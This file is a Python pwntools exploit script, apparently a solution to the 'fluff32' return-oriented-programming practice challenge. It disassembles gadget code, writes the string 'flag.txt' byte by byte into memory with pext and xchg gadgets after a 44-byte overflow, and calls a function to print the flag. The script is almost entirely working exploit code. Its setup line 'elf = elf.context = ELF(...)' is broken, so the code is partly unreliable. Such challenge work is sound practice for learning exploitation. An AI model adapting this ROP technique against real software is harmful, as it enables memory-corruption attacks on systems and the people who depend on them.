#!/usr/bin/env python3

from pwn import *

elf = elf.context = ELF('fluff32')
p = process(elf.path)

### ROP CHAIN ###
'''
gdb-peda$ disas questionableGadgets

0x08048543 <+0>:	mov    eax,ebp
0x08048545 <+2>:	mov    ebx,0xb0bababa
0x0804854a <+7>:	pext   edx,ebx,eax
0x0804854f <+12>:	mov    eax,0xdeadbeef
0x08048554 <+17>:	ret    
0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
0x08048557 <+20>:	ret    
0x08048558 <+21>:	pop    ecx
0x08048559 <+22>:	bswap  ecx
0x0804855b <+24>:	ret

bswap -> troca de little para big endian, ou vice-versa

f - 0x0b4b
l - 0x02dd
a - 0x1d46
g - 0x0b5a
. - 0x00db
t - 0x0acd
x - 0x1ac5
t - 0x0acd
'''
str = [0xb4b,0x2dd,0x1d46,0xb5a,0xdb,0xacd,0x1ac5,0xacd]

### GADGETS ##

pop_ebx = p32(0x08048399) # pop ebx ; ret
pext = p32(0x08048543)

xchg = p32(0x08048555)
pop_ecx = p32(0x08048558)

pop_ebp = p32(0x080485bb) # pop ebp ; ret

section = 0x0804a018

xpl = b''
xpl += b'A' * 44

packer = make_packer(32, endian='big', sign='unsigned')

#mov    eax,ebp
#pext   edx,ebx,eax
function = p32(0x080483d0)

for i in range(8):
	xpl += pop_ebp
	xpl += p32(str[i])
	xpl += pext

	xpl += pop_ecx
	xpl += packer(section + i)

	xpl += xchg

xpl += function
xpl += b'A' * 4
xpl += p32(section)

p.sendline(xpl)
p.interactive()
